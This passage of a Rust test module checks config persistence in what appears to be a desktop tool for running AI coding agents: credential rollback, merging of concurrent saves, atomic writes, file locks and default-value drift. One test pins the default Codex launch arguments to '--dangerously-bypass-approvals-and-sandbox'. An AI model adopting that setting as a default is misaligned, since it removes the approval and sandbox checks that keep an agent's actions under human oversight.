            crate::credentials::get(crate::credentials::Credential::RelayToken).unwrap(),
            Some("old-relay".to_string())
        );
        assert_eq!(
            crate::credentials::get(crate::credentials::Credential::PushVapidPrivateKey).unwrap(),
            Some("old-vapid".to_string())
        );
        assert!(state.config.read().services.auth.session_token.is_empty());
    }

    #[test]
    #[serial_test::serial]
    fn rollback_failure_is_reported_with_the_primary_save_error() {
        use std::sync::atomic::Ordering;

        crate::credentials::reset_test_faults();
        crate::credentials::set(
            crate::credentials::Credential::RemoteSessionToken,
            "old-token",
        )
        .unwrap();
        let mut config = AppConfig::default();
        config.services.auth.session_token = "new-token".to_string();
        config.services.auth.session_token_exists = true;

        let error = save_app_config_with(config, |_| {
            crate::credentials::MOCK_FAIL_WRITES.store(true, Ordering::SeqCst);
            Err("forced disk failure".to_string())
        })
        .expect_err("save and rollback must fail");
        crate::credentials::reset_test_faults();

        assert!(error.contains("forced disk failure"), "{error}");
        assert!(error.contains("credential rollback also failed"), "{error}");
        assert!(error.contains("session token"), "{error}");
    }

    // -----------------------------------------------------------------
    // ConfigFile<T> — cross-process-safe update/save
    // -----------------------------------------------------------------

    #[test]
    #[serial_test::serial]
    fn stale_agents_saves_preserve_independent_changes() {
        let dir = TempDir::new().expect("temp dir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let base = load_agents_config();

        let mut first = base.clone();
        first.headless_agent = Some("claude".to_string());
        let mut second = base.clone();
        second
            .agents
            .entry("claude".to_string())
            .or_default()
            .progress_tracking = Some(true);

        save_agents_config(base.clone(), first).expect("first client save");
        save_agents_config(base, second).expect("second client save");

        let persisted = load_agents_config();
        assert_eq!(persisted.headless_agent.as_deref(), Some("claude"));
        assert_eq!(persisted.agents["claude"].progress_tracking, Some(true));
    }

    #[test]
    #[serial_test::serial]
    fn stale_notification_saves_preserve_independent_changes() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let base = load_notification_config();
        let mut first = base.clone();
        first.enabled = false;
        let mut second = base.clone();
        second.volume = 0.2;
        save_notification_config(base.clone(), first).unwrap();
        save_notification_config(base, second).unwrap();
        let saved = load_notification_config();
        assert!(!saved.enabled);
        assert_eq!(saved.volume.to_bits(), 0.2_f64.to_bits());
    }

    #[test]
    #[serial_test::serial]
    fn stale_ui_prefs_saves_preserve_independent_changes() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let base = load_ui_prefs();
        let mut first = base.clone();
        first.sidebar_visible = false;
        let mut second = base.clone();
        second.settings_expert_mode = true;
        save_ui_prefs(base.clone(), first).unwrap();
        save_ui_prefs(base, second).unwrap();
        let saved = load_ui_prefs();
        assert!(!saved.sidebar_visible);
        assert!(saved.settings_expert_mode);
    }

    #[test]
    #[serial_test::serial]
    fn stale_repo_defaults_saves_preserve_independent_changes() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let base = load_repo_defaults();
        let mut first = base.clone();
        first.base_branch = "main".to_string();
        let mut second = base.clone();
        second.auto_fetch_interval_minutes = 15;
        save_repo_defaults(base.clone(), first).unwrap();
        save_repo_defaults(base, second).unwrap();
        let saved = load_repo_defaults();
        assert_eq!(saved.base_branch, "main");
        assert_eq!(saved.auto_fetch_interval_minutes, 15);
    }

    #[test]
    #[serial_test::serial]
    fn stale_repo_settings_saves_preserve_distinct_repositories() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let base = load_repo_settings();
        let mut first = base.clone();
        first.repos.insert(
            "/alpha".into(),
            RepoSettingsEntry {
                path: "/alpha".into(),
                ..Default::default()
            },
        );
        let mut second = base.clone();
        second.repos.insert(
            "/beta".into(),
            RepoSettingsEntry {
                path: "/beta".into(),
                ..Default::default()
            },
        );
        save_repo_settings(base.clone(), first).unwrap();
        save_repo_settings(base, second).unwrap();
        let saved = load_repo_settings();
        assert!(saved.repos.contains_key("/alpha"));
        assert!(saved.repos.contains_key("/beta"));
    }

    #[test]
    #[serial_test::serial]
    fn stale_pane_layout_saves_preserve_independent_object_keys() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let base = serde_json::json!({"left": {"width": 30}, "right": {"width": 40}});
        ConfigFile::<serde_json::Value>::new(PANE_LAYOUT_FILE)
            .save(&base)
            .unwrap();
        save_pane_layout(
            base.clone(),
            serde_json::json!({"left": {"width": 35}, "right": {"width": 40}}),
        )
        .unwrap();
        save_pane_layout(
            base,
            serde_json::json!({"left": {"width": 30}, "right": {"width": 45}}),
        )
        .unwrap();
        assert_eq!(
            load_pane_layout(),
            serde_json::json!({"left": {"width": 35}, "right": {"width": 45}})
        );
    }

    #[test]
    #[serial_test::serial]
    fn notes_array_replaces_whole_while_unrelated_object_key_survives() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let base = serde_json::json!({"notes": [{"id": "old"}], "meta": "initial"});
        ConfigFile::<serde_json::Value>::new(NOTES_FILE)
            .save(&base)
            .unwrap();
        save_notes(
            base.clone(),
            serde_json::json!({"notes": [{"id": "old"}], "meta": "new"}),
        )
        .unwrap();
        save_notes(
            base,
            serde_json::json!({"notes": [{"id": "new"}], "meta": "initial"}),
        )
        .unwrap();
        assert_eq!(
            load_notes().unwrap(),
            serde_json::json!({"notes": [{"id": "new"}], "meta": "new"})
        );
    }

    #[test]
    #[serial_test::serial]
    fn notes_delta_removes_deleted_key_without_erasing_another_edit() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let base = serde_json::json!({"notes": [], "obsolete": "remove", "other": "old"});
        ConfigFile::<serde_json::Value>::new(NOTES_FILE)
            .save(&base)
            .unwrap();
        save_notes(
            base.clone(),
            serde_json::json!({"notes": [], "obsolete": "remove", "other": "new"}),
        )
        .unwrap();
        save_notes(base, serde_json::json!({"notes": [], "other": "old"})).unwrap();
        assert_eq!(
            load_notes().unwrap(),
            serde_json::json!({"notes": [], "other": "new"})
        );
    }

    #[test]
    #[serial_test::serial]
    fn notes_null_inside_new_object_is_a_delete_marker() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let base = serde_json::json!({});
        save_notes(
            base,
            serde_json::json!({"metadata": {"unset": null, "kept": "value"}}),
        )
        .unwrap();
        assert_eq!(
            load_notes().unwrap(),
            serde_json::json!({"metadata": {"kept": "value"}})
        );
    }

    #[test]
    #[serial_test::serial]
    fn notes_delta_refuses_to_replace_corrupt_file() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let path = dir.path().join(NOTES_FILE);
        fs::write(&path, b"{incomplete").unwrap();
        assert!(
            save_notes(
                serde_json::json!({"notes": []}),
                serde_json::json!({"notes": [{"id": "new"}]})
            )
            .is_err()
        );
        assert!(!path.exists(), "the invalid document must not be replaced");
        let backups: Vec<_> = fs::read_dir(dir.path())
            .unwrap()
            .filter_map(Result::ok)
            .filter(|entry| {
                entry
                    .file_name()
                    .to_string_lossy()
                    .starts_with("notes.corrupt-")
            })
            .collect();
        assert_eq!(backups.len(), 1);
        assert_eq!(fs::read(backups[0].path()).unwrap(), b"{incomplete");
    }

    #[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
    struct CounterDoc {
        counters: HashMap<String, i64>,
    }

    #[test]
    #[serial_test::serial]
    fn update_applies_concurrently_from_two_threads_without_losing_either_mutation() {
        let dir = TempDir::new().expect("temp dir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        let file_a: ConfigFile<CounterDoc> = ConfigFile::new("counters.json");
        let file_b: ConfigFile<CounterDoc> = ConfigFile::new("counters.json");

        let t1 = std::thread::spawn(move || {
            file_a
                .update(|doc| {
                    doc.counters.insert("a".to_string(), 1);
                    true
                })
                .unwrap();
        });
        let t2 = std::thread::spawn(move || {
            file_b
                .update(|doc| {
                    doc.counters.insert("b".to_string(), 2);
                    true
                })
                .unwrap();
        });
        t1.join().unwrap();
        t2.join().unwrap();

        let file: ConfigFile<CounterDoc> = ConfigFile::new("counters.json");
        let doc: CounterDoc = load_json_config_from_path(&file.path);
        assert_eq!(
            doc.counters.get("a"),
            Some(&1),
            "thread A's mutation must survive"
        );
        assert_eq!(
            doc.counters.get("b"),
            Some(&2),
            "thread B's mutation must survive"
        );
    }

    #[test]
    #[serial_test::serial]
    fn update_skips_the_write_when_the_mutate_closure_declines() {
        let dir = TempDir::new().expect("temp dir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let file: ConfigFile<CounterDoc> = ConfigFile::new("doc.json");

        file.update(|_doc| false).unwrap();

        assert!(
            !dir.path().join("doc.json").exists(),
            "update must not create/touch the file when mutate reports no change"
        );
    }

    /// The uncontended half of the contract above: a document another writer replaced
    /// since this caller last read it is overwritten, not refused. Whole-document saves
    /// are last-writer-wins by definition — the caller discards what `load()` returned.
    #[test]
    #[serial_test::serial]
    fn a_whole_document_save_overwrites_a_document_replaced_since_the_last_read() {
        let dir = TempDir::new().expect("temp dir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        ConfigFile::<serde_json::Value>::new(ACTIVITY_FILE)
            .save(&serde_json::json!([{ "id": 1 }]))
            .expect("seed write");
        ConfigFile::<serde_json::Value>::new(ACTIVITY_FILE)
            .save(&serde_json::json!([{ "id": 2 }]))
            .expect("interloper write");

        ConfigFile::<serde_json::Value>::new(ACTIVITY_FILE)
            .save(&serde_json::json!([{ "id": 3 }]))
            .expect("must not be refused");
        assert_eq!(load_activity(), serde_json::json!([{ "id": 3 }]));
    }

    #[test]
    fn persist_atomic_leaves_no_temp_file_when_rename_fails() {
        let dir = TempDir::new().expect("temp dir");
        let target = dir.path().join("target.json");
        // Occupy the target path with a directory so temp->target rename fails
        // (a file can never atomically replace a directory on any platform).
        fs::create_dir(&target).unwrap();

        let result = persist_atomic(&target, b"{}");
        assert!(result.is_err(), "rename onto a directory must fail");

        let leftover: Vec<_> = fs::read_dir(dir.path())
            .unwrap()
            .filter_map(Result::ok)
            .filter(|e| e.file_name().to_string_lossy().contains(".tmp."))
            .collect();
        assert!(
            leftover.is_empty(),
            "temp file must be cleaned up on a failed rename, found: {leftover:?}"
        );
    }

    #[test]
    #[serial_test::serial]
    fn file_lock_blocks_a_second_independent_acquisition_on_the_same_path() {
        let dir = TempDir::new().expect("temp dir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let file: ConfigFile<CounterDoc> = ConfigFile::new("doc.json");

        let held = file
            .acquire_file_lock()
            .expect("first acquisition succeeds");

        let other: ConfigFile<CounterDoc> = ConfigFile::new("doc.json");
        let (tx, rx) = std::sync::mpsc::channel();
        let handle = std::thread::spawn(move || {
            let _second = other.acquire_file_lock().expect("eventually acquires");
            tx.send(()).unwrap();
        });

        let got_it_fast = rx
            .recv_timeout(std::time::Duration::from_millis(200))
            .is_ok();
        assert!(
            !got_it_fast,
            "a second lock acquisition must block while the first is held"
        );

        drop(held);
        handle.join().unwrap();
    }

    // -----------------------------------------------------------------
    // Config defaults (Settings "expert mode") — story 863-03c1
    // -----------------------------------------------------------------

    /// Removing any one field that carries a serde default from a struct's own
    /// full JSON, then re-deserializing, must reproduce that exact default
    /// again. Catches drift between a `#[serde(default = ...)]` attribute and
    /// a hand-written `Default` impl going out of sync — e.g. a field default
    /// function changing without the `impl Default` literal following it, or
    /// vice versa. Fields with no serde default at all (required fields) fail
    /// to parse when removed, which is expected and treated as nothing to
    /// check for that field.
    fn assert_no_field_default_drift<T>(default: &T)
    where
        T: Serialize + DeserializeOwned,
    {
        assert_no_field_default_drift_except(default, &[]);
    }

    /// `allowed_exceptions` lists fields that are *deliberately* asymmetric: a
    /// brand-new config (no file at all) gets the struct's `Default`, while an
    /// existing config file that predates the field gets its `#[serde(default
    /// = ...)]` instead — e.g. `mcp_server_enabled`, where an upgrade must not
    /// silently switch on a network-facing server for a user who never opted
    /// in (see `app_config_serde_default_for_new_fields`). Everything else is
    /// held to the stricter rule: no exception without a name and a reason.
    fn assert_no_field_default_drift_except<T>(default: &T, allowed_exceptions: &[&str])
    where
        T: Serialize + DeserializeOwned,
    {
        let full = serde_json::to_value(default).expect("struct must serialize");
        let obj = full
            .as_object()
            .expect("struct must serialize to a JSON object")
            .clone();
        let mut drifted = Vec::new();
        for key in obj.keys() {
            let mut partial = obj.clone();
            partial.remove(key);
            if let Ok(parsed) = serde_json::from_value::<T>(serde_json::Value::Object(partial))
                && serde_json::to_value(&parsed).unwrap() != full
            {
                drifted.push(key.clone());
            }
        }
        let unexpected: Vec<&String> = drifted
            .iter()
            .filter(|key| !allowed_exceptions.contains(&key.as_str()))
            .collect();
        assert!(
            unexpected.is_empty(),
            "field(s) {unexpected:?}'s serde default drifted from the struct's Default impl \
             (unexpectedly — add to allowed_exceptions only with a documented reason)"
        );
        let unused_exceptions: Vec<&&str> = allowed_exceptions
            .iter()
            .filter(|allowed| !drifted.contains(&(**allowed).to_string()))
            .collect();
        assert!(
            unused_exceptions.is_empty(),
            "allowed_exceptions {unused_exceptions:?} no longer drift — remove the stale exception"
        );
    }

    #[test]
    fn app_config_field_defaults_match_default_impl() {
        assert_no_field_default_drift_except(
            &AppConfig::default(),
            &[
                // Deliberately asymmetric — see the doc comment on
                // `assert_no_field_default_drift_except` and
                // `app_config_serde_default_for_new_fields`.
                "mcp_server_enabled",
            ],
        );
    }

    #[test]
    fn notification_config_field_defaults_match_default_impl() {
        assert_no_field_default_drift(&NotificationConfig::default());
    }

    #[test]
    fn agent_settings_field_defaults_match_default_impl() {
        assert_no_field_default_drift(&AgentSettings::default());
    }

    #[test]
    fn agent_settings_round_trip_native_scrollback_opt_out() {
        let settings: AgentSettings =
            serde_json::from_value(serde_json::json!({"prevent_alt_screen": false})).unwrap();
        let saved = serde_json::to_value(settings).unwrap();
        assert_eq!(saved["prevent_alt_screen"], false);
        assert!(
            serde_json::to_value(AgentSettings::default()).unwrap()["prevent_alt_screen"].is_null()
        );
    }

    #[test]
    fn repo_defaults_config_field_defaults_match_default_impl() {
        assert_no_field_default_drift(&RepoDefaultsConfig::default());
    }

    #[test]
    fn agents_config_field_defaults_match_default_impl() {
        assert_no_field_default_drift(&AgentsConfig::default());
    }

    #[cfg(feature = "dictation")]
    #[test]
    fn dictation_config_field_defaults_match_default_impl() {
        assert_no_field_default_drift(&crate::dictation::commands::DictationConfig::default());
    }

    /// The command must hand back each domain's own `Default::default()` —
    /// never a second, hand-copied list of literal values that could drift
    /// out of sync with it silently.
    #[test]
    fn get_config_defaults_returns_each_domains_own_default() {
        let defaults = get_config_defaults();
        assert_eq!(
            serde_json::to_value(&defaults.app).unwrap(),
            serde_json::to_value(AppConfig::default()).unwrap()
        );
        assert_eq!(
            serde_json::to_value(&defaults.notifications).unwrap(),
            serde_json::to_value(NotificationConfig::default()).unwrap()
        );
        assert_eq!(
            serde_json::to_value(&defaults.agent_settings).unwrap(),
            serde_json::to_value(AgentSettings::default()).unwrap()
        );
        assert_eq!(
            serde_json::to_value(&defaults.repo_defaults).unwrap(),
            serde_json::to_value(RepoDefaultsConfig::default()).unwrap()
        );
        let mut expected = serde_json::to_value(AgentsConfig::default()).unwrap();
        expected["agents"]["codex"] = serde_json::to_value(AgentSettings::default()).unwrap();
        expected["agents"]["codex"]["codex_bypass_migrated"] = serde_json::json!(true);
        expected["agents"]["codex"]["run_configs"] = serde_json::json!([{
            "name": "Codex Default",
            "command": "codex",
            "args": ["--dangerously-bypass-approvals-and-sandbox"],
            "env": {},
            "is_default": true
        }]);
        assert_eq!(
            serde_json::to_value(&defaults.agents).unwrap(),
            expected,
            "the settings baseline includes the same persisted Codex launch migration"
        );
        assert_eq!(
            serde_json::to_value(&defaults.github_accounts).unwrap(),
            serde_json::to_value(crate::github_account::GitHubAccountRegistry::default()).unwrap()
        );
        #[cfg(feature = "dictation")]
        assert_eq!(
            serde_json::to_value(&defaults.dictation).unwrap(),
            // The one deliberate difference: a fresh install resolves the engine
            // to Edge, and the settings panel compares against that.
            serde_json::to_value(crate::dictation::commands::DictationConfig {
                speech_engine: "edge".to_string(),
                ..Default::default()
            })
            .unwrap()
        );
    }

    /// Settings hides the "Add another GitHub account" entry point while
    /// `github_accounts.accounts` equals its default. The key must be in the
    /// payload, empty, and spelled as the registry file spells it; a missing
    /// key would keep the entry point visible for everyone.
    #[test]
    fn get_config_defaults_carries_no_additional_github_accounts() {
        let payload = serde_json::to_value(get_config_defaults()).unwrap();
        assert_eq!(
            payload["github_accounts"]["accounts"],
            serde_json::json!([])
        );
    }

    /// Pins the defaults command to the value a brand-new install actually
    /// loads — not merely to a second, independently-derived
    /// `Default::default()` call, which is what the test above checks.
    /// `load_app_config`/`load_notification_config`/`get_dictation_config`
    /// all fall back to `T::default()` when their file does not exist
    /// (`read_app_config_unlocked`, `load_json_config`) — that fallback,
    /// exercised here against a config dir with no files in it, is the
    /// "fresh install" source of truth this command must mirror. If a
    /// loader's missing-file fallback ever stopped being `T::default()`,
    /// this test would catch the divergence where the one above could not.
    ///
    /// `agent_settings` has no whole-file loader to pin against here: the
    /// on-disk domain is `AgentsConfig` (a map of agent name -> settings),
    /// and there is no single default for the map itself — see the field's
    /// doc comment on `ConfigDefaults`. Intentionally left out of this test.
    #[test]
    #[serial_test::serial]
    fn get_config_defaults_matches_what_a_brand_new_install_loads() {
        crate::credentials::reset_test_faults();
        let dir = TempDir::new().expect("temp dir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        let defaults = get_config_defaults();

        assert_eq!(
            serde_json::to_value(&defaults.app).unwrap(),
            serde_json::to_value(load_app_config()).unwrap(),
            "must match what a fresh config.json-less install loads"
        );
        assert_eq!(
            serde_json::to_value(&defaults.notifications).unwrap(),
            serde_json::to_value(load_notification_config()).unwrap(),
            "must match what a fresh notifications.json-less install loads"
        );
        assert_eq!(
            serde_json::to_value(&defaults.repo_defaults).unwrap(),
            serde_json::to_value(load_repo_defaults()).unwrap(),
            "must match what a fresh repo-defaults.json-less install loads"
        );
        assert_eq!(
            serde_json::to_value(&defaults.agents).unwrap(),
            serde_json::to_value(load_agents_config()).unwrap(),
            "must match what a fresh agents.json-less install loads"
        );
        assert_eq!(
            serde_json::to_value(&defaults.github_accounts).unwrap(),
            serde_json::to_value(crate::github_account::GitHubAccountRegistry::load()).unwrap(),
            "must match what a fresh github_accounts.json-less install loads"
        );
        #[cfg(feature = "dictation")]
        assert_eq!(
            serde_json::to_value(&defaults.dictation).unwrap(),
            serde_json::to_value(crate::dictation::commands::get_dictation_config()).unwrap(),
            "must match what a fresh dictation.json-less install loads"
        );
    }
    // Catches: arithmetic or sentinel defaults silently change new-install attachment limits.
    #[test]
    fn new_install_attachment_defaults_preserve_upload_and_retention_contract() {
        let defaults = AppConfig::default();
        assert_eq!(defaults.attachment_max_bytes, 26_214_400);
        assert_eq!(defaults.attachment_retention_days, 7);
        let mut old_document = serde_json::to_value(defaults).unwrap();
        old_document
            .as_object_mut()
            .unwrap()
            .remove("attachment_max_bytes");
        old_document
            .as_object_mut()
            .unwrap()
            .remove("attachment_retention_days");
        let migrated: AppConfig = serde_json::from_value(old_document).unwrap();
        assert_eq!(migrated.attachment_max_bytes, 26_214_400);
        assert_eq!(migrated.attachment_retention_days, 7);
    }

    // Catches: missing mobile-theme keys deserialize to an empty or invalid theme.
    #[test]
    fn missing_mobile_theme_preserves_the_new_install_commander_theme() {
        assert_eq!(UIPrefsConfig::default().mobile_theme, "commander");
        let mut old_document = serde_json::to_value(UIPrefsConfig::default()).unwrap();
        old_document.as_object_mut().unwrap().remove("mobile_theme");
        let migrated: UIPrefsConfig = serde_json::from_value(old_document).unwrap();
        assert_eq!(migrated.mobile_theme, "commander");
    }

    // Catches: a recovering save reports success while leaving the corrupt document unrepaired.
    #[test]
    fn recovering_delta_persists_desired_document_after_a_corrupt_load() {
        let dir = TempDir::new().unwrap();
        let path = dir.path().join("recovery.json");
        fs::write(&path, b"{broken").unwrap();
        let file = ConfigFile::<serde_json::Value>::at_path(path.clone());
        let desired = serde_json::json!({"setting": "chosen"});
        file.save_delta_recovering(&serde_json::json!({}), &desired)
            .unwrap();
        let stored: serde_json::Value = serde_json::from_slice(&fs::read(path).unwrap()).unwrap();
        assert_eq!(stored, desired);
        assert_eq!(corrupt_backups(dir.path()).len(), 1);
    }

    // Catches: repairing an earlier load discards another writer's valid document.
    #[test]
    fn recovering_delta_preserves_a_document_repaired_by_another_writer() {
        let dir = TempDir::new().unwrap();
        let path = dir.path().join("recovery.json");
        fs::write(&path, br#"{"other":"new"}"#).unwrap();
        let file = ConfigFile::<serde_json::Value>::at_path(path.clone());
        file.save_delta_recovering(
            &serde_json::json!({}),
            &serde_json::json!({"setting": "chosen"}),
        )
        .unwrap();
        let stored: serde_json::Value = serde_json::from_slice(&fs::read(path).unwrap()).unwrap();
        assert_eq!(
            stored,
            serde_json::json!({"other": "new", "setting": "chosen"})
        );
    }

    // Catches: the activity IPC save reports success without persisting the new entries.
    #[test]
    #[serial_test::serial]
    fn activity_save_persists_entries_for_the_next_load() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let desired = serde_json::json!([{"id": "new", "message": "finished"}]);
        save_activity(serde_json::Value::Null, desired.clone()).unwrap();
        assert_eq!(load_activity(), desired);
        assert!(dir.path().join(ACTIVITY_FILE).is_file());
    }

    // Catches: the keybindings IPC save drops a changed binding while reporting success.
    #[test]
    #[serial_test::serial]
    fn keybindings_save_persists_custom_bindings_for_the_next_load() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let desired = serde_json::json!({"search-files": "Ctrl+Shift+P"});
        save_keybindings(serde_json::Value::Null, desired.clone()).unwrap();
        assert_eq!(load_keybindings(), desired);
        assert!(dir.path().join(KEYBINDINGS_FILE).is_file());
    }
}
